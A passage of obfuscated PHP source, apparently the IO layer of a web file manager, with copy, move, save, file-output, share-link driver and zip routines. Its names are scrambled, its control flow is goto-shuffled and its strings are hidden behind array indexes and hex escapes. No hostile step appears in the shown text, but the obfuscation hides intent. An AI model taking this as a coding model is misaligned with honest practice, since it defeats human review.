self::driverMake($E÷ã£÷š[0]); if (method_exists($d¶´°ÙäÉƒ, $DãÎáÒŞí)) { return @call_user_func_array(array($d¶´°ÙäÉƒ, $DãÎáÒŞí), $E÷ã£÷š); } if (method_exists($d¶´°ÙäÉƒ, $_SERVER[Ö¹ñÒÁ²÷][991])) { return @call_user_func_array(array($d¶´°ÙäÉƒ, $DãÎáÒŞí), $E÷ã£÷š); } else { if (method_exists(self, $DãÎáÒŞí)) { return @call_user_func_array(array(self, $DãÎáÒŞí), $E÷ã£÷š); } else { call_user_func_array(array(parent, $DãÎáÒŞí), $E÷ã£÷š); } } } public static function init($b‰ø«¿¨‘à) { return self::driverMake($b‰ø«¿¨‘à); } public static function copy($B¾ä¿‘, $e±öÙ™®®¢, $d‚äš¼Ï‹¿ = false, $dãã§‡Å = false) { return self::copyMove($B¾ä¿‘, $e±öÙ™®®¢, $d‚äš¼Ï‹¿, $_SERVER[Ö¹ñÒÁ²÷][486], $dãã§‡Å); } public static function move($bòñ‘¦Â, $a©·Ô²‹Ç, $Bˆ£çò¢÷Ğ = false, $C®£©¼¯¶ = false) { return self::copyMove($bòñ‘¦Â, $a©·Ô²‹Ç, $Bˆ£çò¢÷Ğ, $_SERVER[Ö¹ñÒÁ²÷][488], $C®£©¼¯¶); } public static function saveFile($C¡ä£Ä¨‹, $AôŞãì›°, $Fö‚¢…ß†è = true) { goto B…ÁìòÕİÚ; B¨í“³è“´: $cÔ­ÍÛÕ²„ = $Eä›ñÌÒä‡->pathFather($AôŞãì›°); $cĞâÒ¹ÌÙµ = !0; if (!$Fö‚¢…ß†è && self::driverIsSame($fáË‡…ÙÖš, $Eä›ñÌÒä‡)) { $cĞâÒ¹ÌÙµ = !1; } goto c•ÏÌÓÁ¹¿; f½ëø“­É³: $Eä›ñÌÒä‡ = self::driverMake($AôŞãì›°); $cÑáÄèãÜŠ = !1; if ($Eä›ñÌÒä‡->pathParse[$a¤­ˆéòÇ[992]]) { $cËŞÍÀ†÷´ = $Eä›ñÌÒä‡->pathParse[$a¤­ˆéòÇ[992]]; $cÑáÄèãÜŠ = $Eä›ñÌÒä‡; $Eä›ñÌÒä‡ = self::driverMake($cËŞÍÀ†÷´); } goto B¨í“³è“´; B…ÁìòÕİÚ: $a¤­ˆéòÇ =& $_SERVER[Ö¹ñÒÁ²÷]; $d¦Œå „ = self::info($AôŞãì›°); $fáË‡…ÙÖš = self::driverMake($C¡ä£Ä¨‹); goto f½ëø“­É³; c•ÏÌÓÁ¹¿: $E•¸ÀÈ©± = self::copyFile($fáË‡…ÙÖš, $C¡ä£Ä¨‹, $Eä›ñÌÒä‡, $cÔ­ÍÛÕ²„, $d¦Œå „[$a¤­ˆéòÇ[28]], $cĞâÒ¹ÌÙµ); if ($cÑáÄèãÜŠ) { $E•¸ÀÈ©± = $cÑáÄèãÜŠ->getPathOuter($E•¸ÀÈ©±); } return $E•¸ÀÈ©±; goto dªÁíæ¾§ì; dªÁíæ¾§ì: } private static function copyMove($D“ğËß¾óœ, $FœÛà‰©Ç, $fÉõÊ¨ó«‡, $A‹ƒà³„ôÇ, $cÕæÖ•ºó× = false) { goto d†—ÔÑÚ·Õ; A¤ŠÉŸŞŒ: Hook::trigger($f­éäŸñá×[72], $d÷³ Ï©´ï, $D“ğËß¾óœ, $E¹âñöºô, $FœÛà‰©Ç); $B‡¹Ö£ = self::driverIsSame($d÷³ Ï©´ï, $E¹âñöºô); if ($B‡¹Ö£) { if ($A‹ƒà³„ôÇ == $f­éäŸñá×[488] && trim($FœÛà‰©Ç, $f­éäŸñá×[8]) == trim($E¹âñöºô->pathFather($D“ğËß¾óœ), $f­éäŸñá×[8])) { return $E¹âñöºô->getPathOuter($D“ğËß¾óœ); } if (method_exists($E¹âñöºô, $A‹ƒà³„ôÇ)) { return $E¹âñöºô->{$A‹ƒà³„ôÇ}($D“ğËß¾óœ, $FœÛà‰©Ç, $fÉõÊ¨ó«‡); } } goto AÛ…»­ °; aâ‘“‰Ï§: $d÷³ Ï©´ï = self::driverMake($D“ğËß¾óœ); $E¹âñöºô = self::driverMake($FœÛà‰©Ç); $f«á¿·ÂÎï = $A‹ƒà³„ôÇ == $f­éäŸñá×[488]; goto añ‚òÑß´; d†—ÔÑÚ·Õ: $f­éäŸñá× =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$D“ğËß¾óœ || $D“ğËß¾óœ == $f­éäŸñá×[8] || !$FœÛà‰©Ç) { return !1; } ignore_timeout(); goto aâ‘“‰Ï§; AÛ…»­ °: $C‡ÙùÔÕ‚Ì = $d÷³ Ï©´ï->isFile($D“ğËß¾óœ); if (!$C‡ÙùÔÕ‚Ì && $E¹âñöºô->getType() == $f­éäŸñá×[691] && $d÷³ Ï©´ï->getType() == $f­éäŸñá×[101]) { $fÄÅ„ñÎ¨ = $E¹âñöºô->copyFolderFromIO($d÷³ Ï©´ï, $D“ğËß¾óœ, $FœÛà‰©Ç, $fÉõÊ¨ó«‡, $f«á¿·ÂÎï, $cÕæÖ•ºó×); } else { $fÄÅ„ñÎ¨ = self::copyPath($d÷³ Ï©´ï, $D“ğËß¾óœ, $E¹âñöºô, $FœÛà‰©Ç, $fÉõÊ¨ó«‡, $f«á¿·ÂÎï, $C‡ÙùÔÕ‚Ì, $cÕæÖ•ºó×); } if ($fÄÅ„ñÎ¨ && $f«á¿·ÂÎï) { $d÷³ Ï©´ï->remove($D“ğËß¾óœ); } goto E£ Ùö°†è; añ‚òÑß´: $EÑ·‚¯Í¢ò = !1; if ($E¹âñöºô->pathParse[$f­éäŸñá×[992]]) { $FœÛà‰©Ç = $E¹âñöºô->pathParse[$f­éäŸñá×[992]]; $EÑ·‚¯Í¢ò = $E¹âñöºô; $E¹âñöºô = self::driverMake($FœÛà‰©Ç); } self::check($d÷³ Ï©´ï, $D“ğËß¾óœ, $E¹âñöºô, $FœÛà‰©Ç); goto A¤ŠÉŸŞŒ; E£ Ùö°†è: if ($EÑ·‚¯Í¢ò) { $fÄÅ„ñÎ¨ = $EÑ·‚¯Í¢ò->getPathOuter($fÄÅ„ñÎ¨); } return $fÄÅ„ñÎ¨; goto b¡´ùô²â±; b¡´ùô²â±: } private static function check($eçì¥¢»œ», $BÊš¥ÁğîŠ, $d»áõË“»˜, &$a°ó½±˜¬) { $E–†‹‹ª£Ë =& $_SERVER[Ö¹ñÒÁ²÷]; if (self::driverIsSame($eçì¥¢»œ», $d»áõË“»˜) && $eçì¥¢»œ»->isFolder($BÊš¥ÁğîŠ) && $eçì¥¢»œ»->isParentOf($BÊš¥ÁğîŠ, $a°ó½±˜¬)) { show_json(LNG($E–†‹‹ª£Ë[993]), !1); } if (!$eçì¥¢»œ»->exist($BÊš¥ÁğîŠ)) { show_json(LNG($E–†‹‹ª£Ë[100]), !1); } } private static function copyPath($E±ÌÉ¾×±±, $AŸèÍëªò–, $aÏ¸¤õ¹ºò, $Dä©Ì×–¶å, $F÷£İé¦“ñ, $cÛ‹×°‹Å¾, $aî›¦Õ§ß¨, $eò³™Ï¹× = false) { goto cºõô†àÍ; e¤´æá£‹: if ($aî›¦Õ§ß¨) { return self::copyFile($E±ÌÉ¾×±±, $AŸèÍëªò–, $aÏ¸¤õ¹ºò, $Dä©Ì×–¶å, $bø­ˆ¥î†ğ, $cÛ‹×°‹Å¾); } if ($F÷£İé¦“ñ == REPEAT_RENAME_FOLDER) { $F÷£İé¦“ñ = !1; } $AÁì¼™‡Õø = rtrim($Dä©Ì×–¶å, $f’õÇª©›·[8]) . $f’õÇª©›·[8] . $bø­ˆ¥î†ğ; goto CÔİ…Ù¡¸²; CÔİ…Ù¡¸²: $eÕ½ò˜İ¹ = $aÏ¸¤õ¹ºò->mkdir($aÏ¸¤õ¹ºò->getPath($AÁì¼™‡Õø)); $Dä©Ì×–¶å = $aÏ¸¤õ¹ºò->getPathInner($eÕ½ò˜İ¹); $E˜ÆÈ²ÔÅê = $E±ÌÉ¾×±±->listPath($AŸèÍëªò–, !0); goto d„ÚôÈğÁ„; d„ÚôÈğÁ„: $Aô•ÙÇÉ¼• = array_merge($E˜ÆÈ²ÔÅê[$f’õÇª©›·[73]], $E˜ÆÈ²ÔÅê[$f’õÇª©›·[74]]); foreach ($Aô•ÙÇÉ¼• as $fÜíáˆå¼ˆ) { $eƒ½”ƒ™ÅÅ = $fÜíáˆå¼ˆ[$f’õÇª©›·[29]] == $f’õÇª©›·[163]; $AŸèÍëªò– = $E±ÌÉ¾×±±->getPathInner($fÜíáˆå¼ˆ[$f’õÇª©›·[75]]); $b®»åš”ìé = self::copyPath($E±ÌÉ¾×±±, $AŸèÍëªò–, $aÏ¸¤õ¹ºò, $Dä©Ì×–¶å, $F÷£İé¦“ñ, $cÛ‹×°‹Å¾, $eƒ½”ƒ™ÅÅ); if (!$b®»åš”ìé) { write_log($f’õÇª©›·[994] . $AŸèÍëªò– . $f’õÇª©›·[995] . $Dä©Ì×–¶å, $f’õÇª©›·[996]); } } return $eÕ½ò˜İ¹; goto F×òŞ›‘áò; cºõô†àÍ: $f’õÇª©›· =& $_SERVER[Ö¹ñÒÁ²÷]; $bø­ˆ¥î†ğ = $eò³™Ï¹× ? $eò³™Ï¹× : $E±ÌÉ¾×±±->getPathName($E±ÌÉ¾×±±->pathThis($AŸèÍëªò–)); if ($F÷£İé¦“ñ) { $fóó¯¾ÔËŠ = $aÏ¸¤õ¹ºò->fileNameExist($Dä©Ì×–¶å, $bø­ˆ¥î†ğ); $bø­ˆ¥î†ğ = $aÏ¸¤õ¹ºò->fileNameAuto($Dä©Ì×–¶å, $bø­ˆ¥î†ğ, $F÷£İé¦“ñ, !$aî›¦Õ§ß¨); $F÷£İé¦“ñ = $fóó¯¾ÔËŠ ? $F÷£İé¦“ñ : !1; } goto e¤´æá£‹; F×òŞ›‘áò: } private static function copyFile($bÑßÂ˜¨ö–, $cÛÚÈ…«±æ, $BŠÙê–Ú×è, $CÒ©—Õô³³, $Cøè†Â÷‚, $c×‰öÌæÕ®) { goto BÌ¨°¢‹˜É; Aù•ƒ‰ğ›: $AĞš¿õï‘ô = $bÑßÂ˜¨ö–->iconvApp($AĞš¿õï‘ô); $aÌì¡ºùÙ‚ = $BŠÙê–Ú×è->upload($CÒ©—Õô³³, $AĞš¿õï‘ô, $c×‰öÌæÕ®); self::remove($f·‚’¾ìàŠ . $A½åé±İâ³); goto F£‹ºë’Ó²; F£‹ºë’Ó²: Hook::trigger($Bç Ø’ÙÈÍ[999], $bÑßÂ˜¨ö–, $cÛÚÈ…«±æ, $BŠÙê–Ú×è, $CÒ©—Õô³³, $Cøè†Â÷‚, $aÌì¡ºùÙ‚); return $aÌì¡ºùÙ‚; goto cËšµ…ÔŸò; BÌ¨°¢‹˜É: $Bç Ø’ÙÈÍ =& $_SERVER[Ö¹ñÒÁ²÷]; $CÒ©—Õô³³ = $BŠÙê–Ú×è->getPath(rtrim($CÒ©—Õô³³, $Bç Ø’ÙÈÍ[8]) . $Bç Ø’ÙÈÍ[8] . $Cøè†Â÷‚); $A½åé±İâ³ = $Bç Ø’ÙÈÍ[997] . time() . rand_string(5); goto EÖÆƒ»”; fŠºÁ‡‚ùí: mk_dir($f·‚’¾ìàŠ); $AĞš¿õï‘ô = $f·‚’¾ìàŠ . $A½åé±İâ³; $AĞš¿õï‘ô = $bÑßÂ˜¨ö–->download($cÛÚÈ…«±æ, $AĞš¿õï‘ô); goto Aù•ƒ‰ğ›; EÖÆƒ»”: Hook::trigger($Bç Ø’ÙÈÍ[998], $bÑßÂ˜¨ö–, $cÛÚÈ…«±æ, $BŠÙê–Ú×è, $CÒ©—Õô³³, $Cøè†Â÷‚, $A½åé±İâ³); if (self::driverIsSame($bÑßÂ˜¨ö–, $BŠÙê–Ú×è)) { if ($c×‰öÌæÕ®) { $aÌì¡ºùÙ‚ = $BŠÙê–Ú×è->moveFile($cÛÚÈ…«±æ, $CÒ©—Õô³³); } else { $aÌì¡ºùÙ‚ = $BŠÙê–Ú×è->copyFile($cÛÚÈ…«±æ, $CÒ©—Õô³³); } Hook::trigger($Bç Ø’ÙÈÍ[999], $bÑßÂ˜¨ö–, $cÛÚÈ…«±æ, $BŠÙê–Ú×è, $CÒ©—Õô³³, $Cøè†Â÷‚, $aÌì¡ºùÙ‚); return $aÌì¡ºùÙ‚; } $f·‚’¾ìàŠ = TEMP_FILES; goto fŠºÁ‡‚ùí; cËšµ…ÔŸò: } public static function pathFather($Fó†­òŒÓ¯) { $Aİ¥à¼…á· = IO::init($Fó†­òŒÓ¯); $f¤¶å¾Üïª = $Aİ¥à¼…á·->pathFather($Aİ¥à¼…á·->path); return $Aİ¥à¼…á·->getPathOuter($f¤¶å¾Üïª); } public static function fileOut($dò²Ä÷ğ‰, $B’¹•Ê´Îã = false, $FÇ½” ­Ëô = false, $eÁÁ¾ó…ÎÑ = '') { $bŒŸ¨“®ˆ = self::driverMake($dò²Ä÷ğ‰); if ($bŒŸ¨“®ˆ->isFileOutServer()) { return $bŒŸ¨“®ˆ->fileOutServer($dò²Ä÷ğ‰, $B’¹•Ê´Îã, $FÇ½” ­Ëô, $eÁÁ¾ó…ÎÑ); } return $bŒŸ¨“®ˆ->fileOut($dò²Ä÷ğ‰, $B’¹•Ê´Îã, $FÇ½” ­Ëô, $eÁÁ¾ó…ÎÑ); } public static function fileOutImage($bæ›å²ÂË‘, $cÍ‘Œì‹å‚ = 250) { $f”±ê§®Œ = array(250, 600, 1200, 3000); for ($c†ë‹¼˜¥¹ = 0; $c†ë‹¼˜¥¹ < count($f”±ê§®Œ); $c†ë‹¼˜¥¹++) { if ($c†ë‹¼˜¥¹ == 0 && $cÍ‘Œì‹å‚ <= $f”±ê§®Œ[$c†ë‹¼˜¥¹]) { $cÍ‘Œì‹å‚ = $f”±ê§®Œ[$c†ë‹¼˜¥¹]; break; } else { if ($cÍ‘Œì‹å‚ > $f”±ê§®Œ[$c†ë‹¼˜¥¹ - 1] && $cÍ‘Œì‹å‚ <= $f”±ê§®Œ[$c†ë‹¼˜¥¹]) { $cÍ‘Œì‹å‚ = $f”±ê§®Œ[$c†ë‹¼˜¥¹]; break; } else { if ($c†ë‹¼˜¥¹ == count($f”±ê§®Œ) - 1 && $cÍ‘Œì‹å‚ > $f”±ê§®Œ[$c†ë‹¼˜¥¹]) { $cÍ‘Œì‹å‚ = $f”±ê§®Œ[$c†ë‹¼˜¥¹]; break; } } } } $F ¸É´Õƒá = self::driverMake($bæ›å²ÂË‘); if ($F ¸É´Õƒá->isFileOutServer()) { return $F ¸É´Õƒá->fileOutImageServer($bæ›å²ÂË‘, $cÍ‘Œì‹å‚); } return $F ¸É´Õƒá->fileOutImage($bæ›å²ÂË‘, $cÍ‘Œì‹å‚); } private static function driverIsSame($Aæ±¡Éöß, $FİçÒ”îé²) { goto EÕì†œˆö¶; FÖ¶»ÇŠ„: if ($Aæ±¡Éöß->pathDriver == $FİçÒ”îé²->pathDriver) { return !0; } return !1; goto cÎù–•™¾ï; EÜ”É“÷“: if ($eÕîøÍ÷˜ != $fÕÓéØÁÎ) { return !1; } if ($eÕîøÍ÷˜ == $EŒóõ×™®[691]) { return !0; } if ($eÕîøÍ÷˜ == $EŒóõ×™®[101]) { return !0; } goto FÖ¶»ÇŠ„; EÕì†œˆö¶: $EŒóõ×™® =& $_SERVER[Ö¹ñÒÁ²÷]; $eÕîøÍ÷˜ = $Aæ±¡Éöß->getType(); $fÕÓéØÁÎ = $FİçÒ”îé²->getType(); goto EÜ”É“÷“; cÎù–•™¾ï: } public static function copyUpdate($E˜œ‚é§ÈÀ, $Dâ¾¬îƒ—ø) { goto F‘‚Œ­§Éª; Dëè¦²Ò—‘: $e®êÙÄæé• = self::_listAll($E˜œ‚é§ÈÀ); $CÈ¨Õ¢„ = self::_listAll($Dâ¾¬îƒ—ø); $FÓ²Á‘°¹æ = array(); goto Dêõ“İÊ‘ø; Dêõ“İÊ‘ø: $fî–­äˆÎÒ = array(); foreach ($e®êÙÄæé• as $c½Òßª¨‰™ => $F»•©ˆğÔƒ) { if (isset($CÈ¨Õ¢„[$c½Òßª¨‰™])) { if ($F»•©ˆğÔƒ[$c¨˜½† ÷•[76]] == 1) { continue; } if ($CÈ¨Õ¢„[$c½Òßª¨‰™][$c¨˜½† ÷•[77]] == $F»•©ˆğÔƒ[$c¨˜½† ÷•[77]]) { continue; } } if ($F»•©ˆğÔƒ[$c¨˜½† ÷•[76]] == 1) { $fî–­äˆÎÒ[] = $Dâ¾¬îƒ—ø . $c¨˜½† ÷•[8] . $c½Òßª¨‰™; continue; } $C£ëËšˆù† = strstr(trim($c½Òßª¨‰™, $c¨˜½† ÷•[8]), $c¨˜½† ÷•[8]) ? get_path_father($c½Òßª¨‰™) : $c¨˜½† ÷•[33]; $FÓ²Á‘°¹æ[] = array($c¨˜½† ÷•[1000] => $F»•©ˆğÔƒ[$c¨˜½† ÷•[75]], $c¨˜½† ÷•[1001] => rtrim($Dâ¾¬îƒ—ø, $c¨˜½† ÷•[8]) . $c¨˜½† ÷•[8] . $C£ëËšˆù†, $c¨˜½† ÷•[1002] => $F»•©ˆğÔƒ); } $cë‡ˆÎ“Ç = array($c¨˜½† ÷•[163] => $FÓ²Á‘°¹æ, $c¨˜½† ÷•[76] => $fî–­äˆÎÒ); goto AÁ˜Œ”ˆØ; F‘‚Œ­§Éª: $c¨˜½† ÷• =& $_SERVER[Ö¹ñÒÁ²÷]; if (!IO::exist($E˜œ‚é§ÈÀ)) { return !1; } if (!IO::exist($Dâ¾¬îƒ—ø)) { IO::mkdir($Dâ¾¬îƒ—ø); } goto Dëè¦²Ò—‘; AÁ˜Œ”ˆØ: Hook::trigger($c¨˜½† ÷•[1003], $E˜œ‚é§ÈÀ, $Dâ¾¬îƒ—ø, $cë‡ˆÎ“Ç); foreach ($fî–­äˆÎÒ as $F»•©ˆğÔƒ) { IO::mkdir($F»•©ˆğÔƒ); } foreach ($FÓ²Á‘°¹æ as $F»•©ˆğÔƒ) { IO::copy($F»•©ˆğÔƒ[$c¨˜½† ÷•[1000]], $F»•©ˆğÔƒ[$c¨˜½† ÷•[1001]], REPEAT_REPLACE); } goto c±ó¸¨í¥¥; c±ó¸¨í¥¥: } private static function _listAll($DçÃÚÒê† ) { $E¼øôÂİ¿¥ =& $_SERVER[Ö¹ñÒÁ²÷]; $DçÃÚÒê†  = KodIO::clear($DçÃÚÒê† ); $d ¡º™¸É” = IO::listAll($DçÃÚÒê† ); foreach ($d ¡º™¸É” as &$C«â‡šÅ’“) { $eŠª¸µ›ª… = substr($C«â‡šÅ’“[$E¼øôÂİ¿¥[75]], strlen($DçÃÚÒê† )); $C«â‡šÅ’“[$E¼øôÂİ¿¥[1004]] = trim($eŠª¸µ›ª…, $E¼øôÂİ¿¥[8]); } return array_to_keyvalue($d ¡º™¸É”, $E¼øôÂİ¿¥[1004]); } public static function fileSubstr($E³»½ÚÂ·¹, $BäÒÄÌè¤ë, $aÑÉñš¾Ã = false) { goto dçà®Ù»¡”; BÈĞÃ”Ö: $cäçµÓ›Ç = $aÑÉñš¾Ã; if ($BäÒÄÌè¤ë < 0) { $BäÒÄÌè¤ë = $cÌ©ïÑŞØ + $BäÒÄÌè¤ë; } if ($aÑÉñš¾Ã === !1) { $aÑÉñš¾Ã = $cÌ©ïÑŞØ - $BäÒÄÌè¤ë; } goto bàâñå”«•; bàâñå”«•: if ($BäÒÄÌè¤ë + $aÑÉñš¾Ã > $cÌ©ïÑŞØ) { $aÑÉñš¾Ã = $cÌ©ïÑŞØ - $BäÒÄÌè¤ë; } if ($aÑÉñš¾Ã <= 0) { return $_SERVER[Ö¹ñÒÁ²÷][33]; } if ($BäÒÄÌè¤ë < 0 || $BäÒÄÌè¤ë >= $cÌ©ïÑŞØ || $aÑÉñš¾Ã > 1024 * 1024 * 5) { throw new Exception("\x66\151\154\x65\122\145\141\x64\x20\x65\162\162\157\x72\x21\x20\x73\164\141\x72\x74\x3d{$BäÒÄÌè¤ë}\x3b\154\145\156\x67\x74\150\x3d{$aÑÉñš¾Ã}\x3b\40\163\x69\x7a\145\x3d{$cÌ©ïÑŞØ}\x3b"); } goto e‘§„æéê; dçà®Ù»¡”: $eí‘í±¶ôã = self::driverMake($E³»½ÚÂ·¹); $cÌ©ïÑŞØ = $eí‘í±¶ôã->size($E³»½ÚÂ·¹); $dƒ„ñôˆñ = $BäÒÄÌè¤ë; goto BÈĞÃ”Ö; e‘§„æéê: return $eí‘í±¶ôã->fileSubstr($E³»½ÚÂ·¹, $BäÒÄÌè¤ë, $aÑÉñš¾Ã); goto e¹¦˜ÃóÁ½; e¹¦˜ÃóÁ½: } private static function driverMake(&$cƒ‘î‘ğ›¾) { goto A–¥ø§¤»·; bŸæ›‰ö¬Ë: return $Cßù± ¨á—; goto Bé´†¹²‚—; BáÎÆÎÕ³Ñ: if ($BÇ½¹ò“¾[$b¢©×öº­å[29]] == KodIO::KOD_IO && !self::$driverListSystem[$BÇ½¹ò“¾[$b¢©×öº­å[363]]]) { return !1; } $cƒ‘î‘ğ›¾ = $BÇ½¹ò“¾[$b¢©×öº­å[1005]]; $Cßù± ¨á— = self::driverGet($BÇ½¹ò“¾, $cƒ‘î‘ğ›¾); goto bŸæ›‰ö¬Ë; A–¥ø§¤»·: $b¢©×öº­å =& $_SERVER[Ö¹ñÒÁ²÷]; $BÇ½¹ò“¾ = KodIO::parse($cƒ‘î‘ğ›¾); if (!self::$driverListSystem) { $aŒ‹©¢ËË¦ = Model($b¢©×öº­å[701])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($aŒ‹©¢ËË¦, $b¢©×öº­å[363]); } goto BáÎÆÎÕ³Ñ; Bé´†¹²‚—: } private static function driverGet($EİÑ¡®Ø”ª, &$e…ò¬ÚùŒ“) { goto FçÀ˜ìÔ›¤; D¯Ê†®š–: switch ($EİÑ¡®Ø”ª[$dù…®Š¼ø§[29]]) { case KodIO::KOD_IO: $fÖÛÔ°†¹ö = self::$driverListSystem[$Aù÷íƒÛ³İ]; break; case KodIO::KOD_SOURCE: $e…ò¬ÚùŒ“ = $Aù÷íƒÛ³İ . $e…ò¬ÚùŒ“; $fÖÛÔ°†¹ö = array($dù…®Š¼ø§[1007] => $dù…®Š¼ø§[1008], $dù…®Š¼ø§[6] => $EİÑ¡®Ø”ª); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $dÆÒá‰±©º = $GLOBALS[$dù…®Š¼ø§[1009]]; self::$driverListUser = array_to_keyvalue($dÆÒá‰±©º, $dù…®Š¼ø§[363]); } $fÖÛÔ°†¹ö = self::$driverListUser[$Aù÷íƒÛ³İ]; break; case KodIO::KOD_SHARE_LINK: $fÖÛÔ°†¹ö = array($dù…®Š¼ø§[1007] => $dù…®Š¼ø§[1010], $dù…®Š¼ø§[6] => $EİÑ¡®Ø”ª); $eö ‚‚‡“ = Action($dù…®Š¼ø§[1011])->sharePathInfo($EİÑ¡®Ø”ª[$dù…®Š¼ø§[75]]); $e…ò¬ÚùŒ“ = $eö ‚‚‡“[$dù…®Š¼ø§[365]]; if (!$eö ‚‚‡“[$dù…®Š¼ø§[365]]) { $C Ğ·äŞ±Ñ = Model($dù…®Š¼ø§[532])->getInfo($eö ‚‚‡“[$dù…®Š¼ø§[437]]); $e…ò¬ÚùŒ“ = KodIO::clear($C Ğ·äŞ±Ñ[$dù…®Š¼ø§[1012]] . $EİÑ¡®Ø”ª[$dù…®Š¼ø§[1005]]); $EİÑ¡®Ø”ª[$dù…®Š¼ø§[435]] = $C Ğ·äŞ±Ñ; $EİÑ¡®Ø”ª[$dù…®Š¼ø§[992]] = $e…ò¬ÚùŒ“; $fÖÛÔ°†¹ö = array($dù…®Š¼ø§[1007] => $dù…®Š¼ø§[1013], $dù…®Š¼ø§[6] => $EİÑ¡®Ø”ª); } break; case KodIO::KOD_SHARE_ITEM: $fÖÛÔ°†¹ö = array($dù…®Š¼ø§[1007] => $dù…®Š¼ø§[1014], $dù…®Š¼ø§[6] => $EİÑ¡®Ø”ª); $C Ğ·äŞ±Ñ = Model($dù…®Š¼ø§[532])->getInfo($EİÑ¡®Ø”ª[$dù…®Š¼ø§[363]]); if ($C Ğ·äŞ±Ñ[$dù…®Š¼ø§[365]] == $dù…®Š¼ø§[464]) { $e…ò¬ÚùŒ“ = KodIO::clear($C Ğ·äŞ±Ñ[$dù…®Š¼ø§[1012]] . $EİÑ¡®Ø”ª[$dù…®Š¼ø§[1005]]); $EİÑ¡®Ø”ª[$dù…®Š¼ø§[435]] = $C Ğ·äŞ±Ñ; $EİÑ¡®Ø”ª[$dù…®Š¼ø§[992]] = $e…ò¬ÚùŒ“; $fÖÛÔ°†¹ö = array($dù…®Š¼ø§[1007] => $dù…®Š¼ø§[1015], $dù…®Š¼ø§[6] => $EİÑ¡®Ø”ª); } break; default: $e…ò¬ÚùŒ“ = $EİÑ¡®Ø”ª[$dù…®Š¼ø§[75]]; $fÖÛÔ°†¹ö = array($dù…®Š¼ø§[1007] => $dù…®Š¼ø§[1016]); break; } $aÊª¡“êëÔ = $EİÑ¡®Ø”ª[$dù…®Š¼ø§[75]]; if (!isset(self::$driverCache[$aÊª¡“êëÔ])) { $f„‘ß¬œ· = strtolower($fÖÛÔ°†¹ö[$dù…®Š¼ø§[90]]); $CÊ¤¼‡ÜæŞ = $GLOBALS[$dù…®Š¼ø§[6]][$dù…®Š¼ø§[84]][$dù…®Š¼ø§[1017]]; $DƒñºµÚ¨Ã = $dù…®Š¼ø§[71] . (isset($CÊ¤¼‡ÜæŞ[$f„‘ß¬œ·]) ? $CÊ¤¼‡ÜæŞ[$f„‘ß¬œ·] : ucfirst($f„‘ß¬œ·)); if (!class_exists($DƒñºµÚ¨Ã)) { show_json("{$DƒñºµÚ¨Ã}\x20\156\157\x74\x20\x65\x78\151\163\164\x73\x21", !1); } $BÀ“·ƒš÷ì = isset($fÖÛÔ°†¹ö[$dù…®Š¼ø§[6]]) ? $fÖÛÔ°†¹ö[$dù…®Š¼ø§[6]] : !1; self::$driverCache[$aÊª¡“êëÔ] = new $DƒñºµÚ¨Ã($BÀ“·ƒš÷ì); } goto bì“ÔÆºõ; fÖä•³ÃÔ: $cß´öó¼Â->path = $e…ò¬ÚùŒ“; return $cß´öó¼Â; goto DÃ½ÆÁ‘˜; FçÀ˜ìÔ›¤: $dù…®Š¼ø§ =& $_SERVER[Ö¹ñÒÁ²÷]; $f’°Ê·ç = $EİÑ¡®Ø”ª[$dù…®Š¼ø§[1006]]; $Aù÷íƒÛ³İ = $EİÑ¡®Ø”ª[$dù…®Š¼ø§[363]]; goto D¯Ê†®š–; bì“ÔÆºõ: $cß´öó¼Â = self::$driverCache[$aÊª¡“êëÔ]; $cß´öó¼Â->pathDriver = $f’°Ê·ç; $cß´öó¼Â->pathBase = $dù…®Š¼ø§[33]; goto c›‘Ö‰ØïÆ; c›‘Ö‰ØïÆ: if (isset($fÖÛÔ°†¹ö[$dù…®Š¼ø§[6]][$dù…®Š¼ø§[1018]])) { $cß´öó¼Â->pathBase = rtrim($fÖÛÔ°†¹ö[$dù…®Š¼ø§[6]][$dù…®Š¼ø§[1018]], $dù…®Š¼ø§[8]) . $dù…®Š¼ø§[8]; $e…ò¬ÚùŒ“ = $cß´öó¼Â->pathBase . ltrim($e…ò¬ÚùŒ“, $dù…®Š¼ø§[8]); } $e…ò¬ÚùŒ“ = $cß´öó¼Â->getPath($e…ò¬ÚùŒ“); if (isset($EİÑ¡®Ø”ª[$dù…®Š¼ø§[992]])) { $e…ò¬ÚùŒ“ = $EİÑ¡®Ø”ª[$dù…®Š¼ø§[992]]; } goto fÖä•³ÃÔ; DÃ½ÆÁ‘˜: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $b«÷‹ Öö³; if (!$b«÷‹ Öö³) { $b…‹Ïã£˜É = IO::init($_SERVER[Ö¹ñÒÁ²÷][8]); } return $b…‹Ïã£˜É; } private static function iconvSystem($B«Œ­„êÙá) { return self::local()->iconvSystem($B«Œ­„êÙá); } private static function iconvApp($c¤×Åé’) { return self::local()->iconvApp($c¤×Åé’); } public static function zip($cç’ÉÂİô, $cõòŞé ä = "\x7a\151\160", $Cã²êâô = '', $E¹Ù›® = REPEAT_RENAME) { goto d¦‡è°¥ˆš; cª´Œ×É Ê: $D†Å¾¼¤¦‹ = $c„ø ŒŸ¢ . $aÎÕØÏÚº¯ . $EóÕëÖÆ—¿[91] . $cõòŞé ä; $D†Å¾¼¤¦‹ = get_filename_auto($D†Å¾¼¤¦‹, $EóÕëÖÆ—¿[33], $E¹Ù›®); $a—· ¶â = self::iconvSystem($D†Å¾¼¤¦‹); goto FùƒÉášªì; FùƒÉášªì: foreach ($EËÂÓ‹´„» as $c¹­†ÜÊ‡ => $aÚ…µõ‹¬) { $EËÂÓ‹´„»[$c¹­†ÜÊ‡] = self::iconvSystem($aÚ…µõ‹¬); } KodArchive::create($a—· ¶â, $EËÂÓ‹´„»); if (!IO::exist($D†Å¾¼¤¦‹)) { if ($Cï…äò¯‘) { del_dir($Cï…äò¯‘); } show_json(LNG($EóÕëÖÆ—¿[1021]), !1); } goto bòÎ‘‡„é; A°°¿«³¼Š: $Cï…äò¯‘ = !1; if (!$Cã²êâô && $E »ØŒí‚ƒ->getType() == $EóÕëÖÆ—¿[101]) { $EËÂÓ‹´„» = self::zipFileList($cç’ÉÂİô); } else { $Cï…äò¯‘ = $Cã²êâô ? $Cã²êâô : TEMP_FILES . $EóÕëÖÆ—¿[1019] . time() . rand_string(8) . $EóÕëÖÆ—¿[8]; mk_dir($Cï…äò¯‘); $EËÂÓ‹´„» = self::zipFileList($cç’ÉÂİô, $Cï…äò¯‘); } $aÎÕØÏÚº¯ = 